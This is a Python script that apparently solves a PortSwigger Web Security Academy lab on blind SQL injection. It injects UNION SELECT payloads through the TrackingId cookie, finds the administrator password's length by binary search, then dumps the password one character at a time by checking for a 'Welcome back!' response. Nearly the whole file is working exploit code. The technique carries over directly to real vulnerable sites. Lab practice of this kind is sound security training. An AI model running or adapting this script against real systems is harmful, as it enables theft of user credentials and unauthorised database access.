#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   Version 
#   Author: WildfootW
#   GitHub: github.com/WildfootW
#   Copyleft (C) 2020 WildfootW All rights reversed.
#
# SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
# if any string return by this SQL request, we have welcome back page
# SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'XYZ' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND length(password) > 10-- 
# if condition return True, the whole syntax return "WildfootW"
#
# MySQL
#
# Remeber modify Host. Do not use valid Cookies.
# Char binary search failed due to don't know SQL char order
# ('n' > "M" & 'n' < "N" can be True)

import requests
import re
from enum import Enum

#test_chars = """ !"#$%&'()*+,-./"""
test_chars = """ !"#$%&()*+,-./""" # remove '
test_chars += "0123456789"
test_chars += ":;<=>?@"
test_chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
test_chars += "[\]^_`"
test_chars += "abcdefghijklmnopqrstuvwxyz"
test_chars += "{|}~"

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

headers = {
    'Host': 'ac161f201e9adf19800b8751002f002d.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
}

cookies = {
    'TrackingId': 'XYZ', # use invalid id
    'session': 'wsuAhTce2oFXHJEPYrUTW8X5JARNSZy9'
}

class Compare(Enum):
    GREATER = 0
    LESS    = 1
    EQUAL   = 2


def blind_sqli(append):
    custom_cookies = cookies.copy()
    custom_cookies['TrackingId'] += append

    response = requests.get('https://' + headers['Host'] + '/', headers=headers, cookies=custom_cookies, verify=False, proxies=proxies)
    if re.search("Welcome back!", response.text):
        return True
    else: # Will return NoneType
        return False

def blind_sqli_password_length(compare, length):
    if compare == Compare.GREATER:
        return blind_sqli("' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND length(password) > " + str(length) + "-- ")
    elif compare == Compare.LESS:
        return blind_sqli("' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND length(password) < " + str(length) + "-- ")
    elif compare == Compare.EQUAL:
        return blind_sqli("' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND length(password) = " + str(length) + "-- ")

#def blind_sqli_password_char(compare, pos, test_char):
#    if compare == Compare.GREATER:
#        return blind_sqli("' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND SUBSTRING(password, " + str(pos + 1) + ", 1) > '" + test_char + "'-- ")
#    elif compare == Compare.LESS:
#        return blind_sqli("' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND SUBSTRING(password, " + str(pos + 1) + ", 1) < '" + test_char + "'-- ")
#    elif compare == Compare.EQUAL:
#        return blind_sqli("' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND SUBSTRING(password, " + str(pos + 1) + ", 1) = '" + test_char + "'-- ")

def password_length_binary_search(left = 0, right = 100):
    print("Test Length: ", end = "")
    while left <= right:
        mid = int((left + right) / 2)
        print(mid, "", end = "", flush = True)
        if   blind_sqli_password_length(Compare.LESS, mid):
            right = mid - 1
        elif blind_sqli_password_length(Compare.GREATER, mid):
            left = mid + 1
        elif blind_sqli_password_length(Compare.EQUAL, mid):
            print("Check!")
            return mid
    return -1

#def password_char_binary_search(pos, left = 0, right = len(test_chars) - 1):
#    print("Test Char: ", end = "")
#    while left <= right:
#        mid = int((left + right) / 2)
#        print(test_chars[mid], "", end = "", flush = True)
#        if   blind_sqli_password_char(Compare.LESS, pos, test_chars[mid]):
#            right = mid - 1
#        elif blind_sqli_password_char(Compare.GREATER, pos, test_chars[mid]):
#            left = mid + 1
#        elif blind_sqli_password_char(Compare.EQUAL, pos, test_chars[mid]):
#            print("Check!")
#            return test_chars[mid]
#    return None
#
#def password_dump_by_binary_search(length):
#    ret = ""
#    for i in range(length):
#        ret += password_char_binary_search(i)
#    return ret

def password_dump_by_scan(length):
    ret = ""
    for i in range(length):
        print("Test Password", ret, ":", end = "")
        for j in range(len(test_chars)):
            print(test_chars[j], end = "", flush = True)
            if blind_sqli("' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, " + str(i + 1) + ") = '" + ret + test_chars[j] + "'-- "):
                ret += test_chars[j]
                break
        print(" Check!")
    return ret

if __name__ == "__main__":
    #print(blind_sqli("' AND '1' = '1")) # TRUE
    #print(blind_sqli("' AND '1' = '2")) # FALSE
    #print(blind_sqli("' UNION SELECT 'a' WHERE 1 = 1 -- ")) # TRUE
    #print(blind_sqli("' UNION SELECT 'a' WHERE 1 = 2 -- ")) # FLASE
    #print(blind_sqli("' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND length(password) > 19 -- ")) # TRUE
    #print(blind_sqli("' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND length(password) > 20 -- ")) # FALSE

    password_length = password_length_binary_search()
    print(password_length)
    #print(password_dump_by_binary_search(password_length))
    print(password_dump_by_scan(password_length))

